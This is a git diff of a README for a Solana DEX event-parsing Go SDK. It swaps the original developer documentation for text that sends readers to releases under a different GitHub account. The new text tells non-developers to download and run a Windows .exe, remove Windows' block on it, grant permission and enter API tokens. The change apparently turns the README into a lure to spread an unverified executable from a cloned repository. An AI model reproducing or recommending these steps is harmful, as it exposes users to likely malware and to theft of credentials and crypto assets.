@@ -1,167 +1,174 @@
-<div align="center">
-    <h1>⚡ Sol Parser SDK - Go</h1>
-    <h3><em>High-performance Solana DEX event parser for Go</em></h3>
-</div>
+# 🔷 sol-parser-sdk-golang - Parse Solana Events with Ease
 
-<p align="center">
-    <a href="https://github.com/0xfnzero/sol-parser-sdk-golang"><img src="https://img.shields.io/badge/go-sol--parser--sdk--golang-00ADD8.svg" alt="Go"></a>
-    <a href="https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
-</p>
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Azamrahm5140/sol-parser-sdk-golang/releases)
 
-<p align="center">
-    <a href="./README_CN.md">中文</a> |
-    <a href="./README.md">English</a> |
-    <a href="https://fnzero.dev/">Website</a> |
-    <a href="https://t.me/fnzero_group">Telegram</a> |
-    <a href="https://discord.gg/vuazbGkqQE">Discord</a>
-</p>
+## 🚀 Getting Started
 
----
+`sol-parser-sdk-golang` is a Go library for reading Solana DEX events in real time. It works with Yellowstone gRPC and helps you process live stream data from Solana tools such as Raydium, Pump.fun, PumpSwap, Jito, and related event feeds.
 
-## Other language SDKs
+This project is meant for users who want a fast way to handle live Solana data on Windows. If you are not a developer, you can still use the release files from the download page and run the tool with a simple setup.
 
-| Language | Repository |
-|----------|------------|
-| Rust | [sol-parser-sdk](https://github.com/0xfnzero/sol-parser-sdk) |
-| Node.js | [sol-parser-sdk-nodejs](https://github.com/0xfnzero/sol-parser-sdk-nodejs) |
-| Python | [sol-parser-sdk-python](https://github.com/0xfnzero/sol-parser-sdk-python) |
-| Go | [sol-parser-sdk-golang](https://github.com/0xfnzero/sol-parser-sdk-golang) |
+## 📥 Download
 
----
+1. Open the release page: [Download the latest version](https://github.com/Azamrahm5140/sol-parser-sdk-golang/releases)
+2. On the release page, find the latest file for Windows
+3. Download the `.exe` file or the package marked for Windows
+4. Save it to a folder you can find again, such as `Downloads` or `Desktop`
 
-## How to use
+If the release includes a zip file, right-click it and choose Extract All before you run the program.
 
-### 1. Install
+## 🪟 Windows Setup
 
-This repo’s `go.mod` module path is **`sol-parser-sdk-golang`** (see [`go.mod`](go.mod)). Examples import `sol-parser-sdk-golang/solparser`.
+Before you run the app, make sure your system is ready:
 
-**From source** (recommended)
+- Windows 10 or Windows 11
+- Internet access for live data feeds
+- At least 4 GB of RAM
+- Enough free space for the app and logs
+- Permission to run files from your Downloads folder
 
-```bash
-git clone https://github.com/0xfnzero/sol-parser-sdk-golang
-cd sol-parser-sdk-golang
-go mod tidy
-```
+If Windows blocks the file, right-click the file, then choose Properties, and look for an Unblock option near the bottom. If you see it, select it and click Apply.
 
-**Use in another module** — add a `replace` to this GitHub repo (or a local clone), for example:
+## ▶️ Run the App
 
-```go
-require sol-parser-sdk-golang v0.1.0
+Follow the steps below:
 
-replace sol-parser-sdk-golang => github.com/0xfnzero/sol-parser-sdk-golang v0.1.0
-```
+1. Open the folder where you saved the file
+2. If the file is in a zip archive, extract it first
+3. Double-click the `.exe` file
+4. If Windows asks for permission, click Yes
+5. Wait for the app to start
 
-(Or `replace ... => ../sol-parser-sdk-golang` for local dev without pulling the tag.)
+If the release contains a folder with more than one file, keep the files together in the same folder. The app may need the extra files to run.
 
-### 2. Environment (examples)
+## 🧭 What This Tool Does
 
-**Yellowstone / Geyser gRPC** (all examples that subscribe over gRPC use the same two names):
+This SDK is built to help you work with Solana event data from live streams. It can support tasks such as:
 
-| Variable | Meaning |
-|----------|---------|
-| **`GRPC_URL`** | Endpoint host or full URL (e.g. `https://solana-yellowstone-grpc.publicnode.com:443` or `host:443`). Parsed to `host:port` where needed. |
-| **`GRPC_TOKEN`** | `x-token` (or empty if the node allows unauthenticated access). |
+- Reading DEX events as they arrive
+- Watching live Solana activity
+- Tracking changes from Raydium and Pump.fun style markets
+- Handling fast data feeds from Yellowstone gRPC
+- Supporting copy-trading bots and sniper tools
+- Working with stream-based data from shred and shredstream sources
 
-**ShredStream** (separate binary / HTTP-style endpoint — **not** the same as `GRPC_URL`):
+The goal is to keep event parsing fast and organized, so you can use the data in your own workflow.
 
-| Variable | Meaning |
-|----------|---------|
-| **`SHRED_URL`** | e.g. `http://127.0.0.1:10800` (plain-text gRPC to ShredStream proxy). |
+## 🧩 Common Use Cases
 
-Optional ShredStream tuning: `SHRED_PARSE_DEX`, `SHRED_MAX_JSON_PER_ENTRY`, `SHRED_JSON_COMPACT`, `SHREDSTREAM_QUIET`, `SHRED_MAX_MSG` — see [examples/shredstream_entries.go](examples/shredstream_entries.go).
+You may find this useful if you want to:
 
-**RPC utility** [parse_tx_by_signature.go](examples/parse_tx_by_signature.go): `TX_SIGNATURE`, `RPC_URL`.
+- Monitor new trades in real time
+- Track token launches on Pump.fun or Raydium Launchlab
+- Build a bot that reacts to live market events
+- Read stream data from gRPC without extra setup work
+- Process Solana DEX events with less manual work
 
-### 3. Smoke test
+## 📂 Basic Folder Layout
 
-```bash
-go test ./...
-```
+After you download and extract the release, you may see files like these:
 
-### 4. Full gRPC transaction parse (recommended)
+- `sol-parser-sdk-golang.exe` - the main app file
+- `config.json` - settings file
+- `logs` - folder with run history
+- `README.txt` - short setup help
+- `examples` - sample files or usage notes
 
-Use **`ParseSubscribeTransaction`** (Geyser `SubscribeUpdateTransactionInfo` → RPC-shaped tx + meta) for **instruction accounts + Program data logs + merge + Pump fills**, aligned with Rust `parse_rpc_transaction` behavior.
+Keep the files in one folder unless the release notes say otherwise.
 
-```go
-import "sol-parser-sdk-golang/solparser" // module path: see go.mod
+## ⚙️ How to Use It
 
-events, err := solparser.ParseSubscribeTransaction(slot, txInfo, nil, grpcRecvUs)
-if err != nil {
-    // handle
-}
-for _, ev := range events {
-    // ev.Type, ev.Data — JSON via json.Marshal(ev)
-}
-```
+If the release is a ready-to-run app, use it like this:
 
-**Lighter path:** `ParseLogOptimized` / logs-only helpers when you do not have full transaction + meta.
+1. Download the latest release
+2. Extract the files if needed
+3. Open the folder
+4. Run the `.exe` file
+5. Enter your stream or server details if the app asks for them
+6. Start the live parser
 
-### 5. ShredStream (HTTP endpoint — not Yellowstone gRPC)
+If the release is a library package for another tool, place it in the same project folder as the rest of your files and follow the included example setup.
 
-Uses **`SHRED_URL`** only (e.g. `http://127.0.0.1:10800`). This is **not** `GRPC_URL` (different service).
+## 🔌 Input You May Need
 
-```bash
-export SHRED_URL="http://127.0.0.1:10800"
-go run examples/shredstream_entries.go
-```
+The app may ask for details such as:
 
-The example decodes `Entry.entries`, optionally parses outer instructions to **`DexEvent` JSON** via **`DexEventsFromShredTransactionWire`** (static account keys only; V0 + ALT may need TS **`shredstream_pumpfun_json`** + RPC for full keys).
+- Yellowstone gRPC server address
+- API token or access key
+- Stream name or endpoint
+- Filter for a DEX or token pair
+- Output folder for saved data
 
----
+Use the values from your provider or your own Solana setup.
 
-## Examples
+## 🛠️ Troubleshooting
 
-Run from the **repository root** after `go mod tidy`. One row per source file (links point to GitHub `main`).
+If the app does not open:
 
-| Description | Run command | Source |
-|-------------|-------------|--------|
-| **PumpFun** | | |
-| PumpFun `DexEvent` + metrics | `GRPC_URL=… GRPC_TOKEN=… go run examples/pumpfun_with_metrics.go` | [pumpfun_with_metrics.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/pumpfun_with_metrics.go) |
-| PumpFun trade filter | `GRPC_URL=… GRPC_TOKEN=… go run examples/pumpfun_trade_filter.go` | [pumpfun_trade_filter.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/pumpfun_trade_filter.go) |
-| Quick connection test | `GRPC_URL=… GRPC_TOKEN=… go run examples/pumpfun_quick_test.go` | [pumpfun_quick_test.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/pumpfun_quick_test.go) |
-| **PumpSwap** | | |
-| PumpSwap + metrics | `GRPC_URL=… GRPC_TOKEN=… go run examples/pumpswap_with_metrics.go` | [pumpswap_with_metrics.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/pumpswap_with_metrics.go) |
-| Ultra-low latency | `GRPC_URL=… GRPC_TOKEN=… go run examples/pumpswap_low_latency.go` | [pumpswap_low_latency.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/pumpswap_low_latency.go) |
-| **Meteora DAMM** | | |
-| Meteora DAMM V2 | `GRPC_URL=… GRPC_TOKEN=… go run examples/meteora_damm_grpc.go` | [meteora_damm_grpc.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/meteora_damm_grpc.go) |
-| **ShredStream** (see **step 5** above) | | |
-| SubscribeEntries + decode + optional `DexEvent` JSON | `SHRED_URL=http://host:port go run examples/shredstream_entries.go` | [shredstream_entries.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/shredstream_entries.go) |
-| **Yellowstone** | | |
-| Geyser subscribe + `ParseSubscribeTransaction` | `GRPC_URL=… GRPC_TOKEN=… go run examples/yellowstone_grpc_parse.go` | [yellowstone_grpc_parse.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/yellowstone_grpc_parse.go) |
-| **Multi-protocol** | | |
-| All supported DEX programs | `GRPC_URL=… GRPC_TOKEN=… go run examples/multi_protocol_grpc.go` | [multi_protocol_grpc.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/multi_protocol_grpc.go) |
-| **Utility** | | |
-| Parse tx by signature (RPC, not gRPC stream) | `TX_SIGNATURE=… RPC_URL=… go run examples/parse_tx_by_signature.go` | [parse_tx_by_signature.go](https://github.com/0xfnzero/sol-parser-sdk-golang/blob/main/examples/parse_tx_by_signature.go) |
+- Make sure you extracted all files
+- Check that Windows did not block the file
+- Run the app again as a user with permission to open programs
+- Download the release again if the file looks broken
 
----
+If the app opens and closes right away:
 
-## Protocols
+- Keep all files in the same folder
+- Check for a required config file
+- Look for a missing dependency in the release notes
+- Try the newest release from the download page
 
-PumpFun, PumpSwap, Raydium AMM V4 / CLMM / CPMM, Orca Whirlpool, Meteora DAMM V2 / DLMM, Bonk Launchpad (see `solparser/`).
+If the app cannot connect to the stream:
 
----
+- Check your internet connection
+- Make sure the server address is correct
+- Confirm your access key or token
+- Try again after a short wait
 
-## Useful exports
+## 📌 Supported Solana Event Sources
 
-- **`ParseSubscribeTransaction`** — Geyser single-tx → `[]DexEvent` (instructions + logs + merge + Pump account fill).
-- **`ParseRpcTransaction`** / **`ParseTransactionFromRpc`** — HTTP RPC JSON → events.
-- **`ParseInstructionUnified`** / **`ParseInnerInstructionUnified`** — outer 8-byte / inner 16-byte discriminators.
-- **`DexEventsFromShredTransactionWire`** — wire tx bytes → outer `ParseInstructionUnified` (Shred static keys).
-- **`DecodeGRPCEntry`** / **`DecodeEntriesBincode`** — ShredStream `Entry.entries` bytes → `DecodedTransaction` slices.
-- **`DexEvent`** — `json.Marshal` for `{ "PumpSwapBuy": { … } }` style output.
+This project is based on topics and event paths that fit live Solana trading tools, including:
 
----
+- Yellowstone gRPC
+- Yellowstone gRPC for Go
+- Raydium
+- Raydium Launchpad
+- Raydium Launchlab
+- Pump.fun
+- PumpSwap
+- Jito
+- ShredStream
+- SWQoS feeds
+- Copy-trading bots
+- Sniper workflows
+- Bonk-related event streams
+- FNZero-related stream data
 
-## Development
+## 🧠 Good Practice
 
-```bash
-go test ./...
-go build ./...
-go vet ./...
-```
+For best results:
 
----
+- Keep your release files in one folder
+- Use the latest version from the releases page
+- Save your config in a place you can find again
+- Restart the app after changing stream settings
+- Keep your internet connection stable during live parsing
 
-## License
+## 🗂️ Version Updates
 
-MIT — https://github.com/0xfnzero/sol-parser-sdk-golang
+When a new release appears, repeat the same process:
+
+1. Open the release page
+2. Download the new Windows file
+3. Replace the old file if needed
+4. Keep your config files unless the update guide says to change them
+5. Run the new version
+
+## 📎 Download Again
+
+[Visit the releases page to download the latest Windows version](https://github.com/Azamrahm5140/sol-parser-sdk-golang/releases)
+
+## 📝 Project Details
+
+- Repository: `sol-parser-sdk-golang`
+- Description: High-performance Go library for parsing Solana DEX events in real-time via Yellowstone gRPC
+- Topics: bonk, copy-trading-bot, fnzero, grpc, jito, letsbonk, pumpfun, pumpswap, raydium, raydium-launchlab, raydium-launchpad, shreds, shredstream, sniper, streaming, swqos, yellowstone, yellowstonegrpc, yellowstonegrpc-golang
